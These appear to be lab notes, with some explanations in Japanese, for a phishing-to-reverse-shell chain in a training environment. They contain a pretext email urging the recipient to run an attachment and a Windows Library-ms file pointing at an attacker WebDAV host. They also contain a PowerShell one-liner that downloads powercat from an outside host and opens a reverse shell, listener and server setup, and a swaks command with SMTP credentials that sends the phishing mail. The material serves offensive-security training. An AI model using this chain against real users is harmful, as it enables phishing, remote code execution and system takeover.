# prepare
### body.txt
```
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

John
```

### config.Library-ms
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://KALIIP</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

### reverseshell script using powercat
you shoud launch the webserver
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.x.x:8000/powercat.ps1'); powercat -c 192.168.x.x -p 4444 -e powershell"
```
### powercat.ps1
```
cp ~/powercat.ps1 ./
```
### webserver
```
python3 -m http.server 8000
```
### webdav server
```
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root `pwd`
```
### nc listener
```
rlwrap nc -nlvp 4444
```
# swaks
send phishing mail
```
sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.x.x --body @body.txt --header "Subject: Staging Script" --suppress-data -au maildmz@relia.com -ap DPuBT9tGCBrTbR
```

コマンドの意味
-t : 宛先(To)
--from: 送信元(From)
--attach: @添付ファイル（@をつけるとファイルを指定できる
--server: SMTPサーバIPまたはホスト名
--body: @本文をファイルから読み取る（@をつけてファイル指定)
--header: メールヘッダを追加
--suppress-data: 実際にデータは送らずSMTPのテストのみする
-au: SMTP認証で使うユーザ名
-ap: SMTP認証で使うパスワード

